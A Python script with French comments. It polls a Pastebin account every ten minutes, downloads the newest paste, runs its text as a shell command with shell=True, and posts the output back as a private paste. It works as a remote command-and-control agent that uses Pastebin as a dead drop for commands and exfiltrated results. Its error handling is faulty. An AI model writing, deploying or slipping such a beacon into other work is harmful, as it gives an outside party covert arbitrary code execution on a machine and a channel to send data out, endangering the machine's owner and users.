import time

import requests
import xml.etree.ElementTree as ET
import subprocess

API_KEY = "API"  # ok pour perso
USER = "USER"
PASSWORD = "MDP"     # ok pour perso

find = False

# 1) Login -> api_user_key
r = requests.post("https://pastebin.com/api/api_login.php", data={
    "api_dev_key": API_KEY,
    "api_user_name": USER,
    "api_user_password": PASSWORD
})
r.raise_for_status()
api_user_key = r.text.strip()
print("api_user_key:", api_user_key)
while not find:
    # 2) Récupère la liste (jusqu'à 50) et sélectionne le VRAI dernier par date
    r = requests.post("https://pastebin.com/api/api_post.php", data={
        "api_dev_key": API_KEY,
        "api_user_key": api_user_key,
        "api_option": "list",
        "api_results_limit": "50"
    })
    r.raise_for_status()

    root = ET.fromstring(f"<root>{r.text}</root>")

    latest_item = None
    latest_ts = -1
    for item in root.iter("paste"):
        ts = int(item.findtext("paste_date", "0"))
        if ts > latest_ts:
            latest_ts = ts
            latest_item = item

    if latest_item is not None:
        paste_key = latest_item.findtext("paste_key")
        nom_past = latest_item.findtext("paste_title") or "Sans titre"


        if nom_past != "Sans titre" and nom_past.find("_reponse") == -1:
            find = True
        else:
            print("pas trouvé")

    print("no paste find")
    time.sleep(600)



print(f"Dernier paste: key={paste_key}, title={nom_past}, ts={latest_ts}")

# 3) Récupère le contenu du dernier paste
resp = requests.post("https://pastebin.com/api/api_raw.php", data={
    "api_dev_key": API_KEY,
    "api_user_key": api_user_key,
    "api_option": "show_paste",
    "api_paste_key": paste_key
})
resp.raise_for_status()
content = resp.text.strip()

print("\n=== CONTENU DU PASTE ===\n")
print(content)
print("\n=== FIN CONTENU DU PASTE ===\n")

# 4) Exécute la commande proprement

try:
    result = subprocess.run(
        content,                      # la commande
        shell=True,
        text=True,
        timeout=60,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # fusionne stderr -> stdout
    )
except:
    result = ""
retour = result.stdout
print("\n=== DEBUT REPONSE DE LA COMMANDE ===\n")
print(retour)
print("\n=== FIN REPONSE DE LA COMMANDE ===\n")
# 5) Crée un nouveau paste avec le résultat
payload = {
    "api_dev_key": API_KEY,
    "api_user_key": api_user_key,    # requis si tu veux le mettre en privé
    "api_option": "paste",
    "api_paste_code": f"{retour}_reponse",
    "api_paste_name": f"{nom_past}_reponse",
    "api_paste_private": "2",        # 0=public, 1=non listé, 2=privé
    "api_paste_expire_date": "N"     # N=jamais
}
r = requests.post("https://pastebin.com/api/api_post.php", data=payload)
r.raise_for_status()
print("URL du nouveau paste:", r.text.strip())
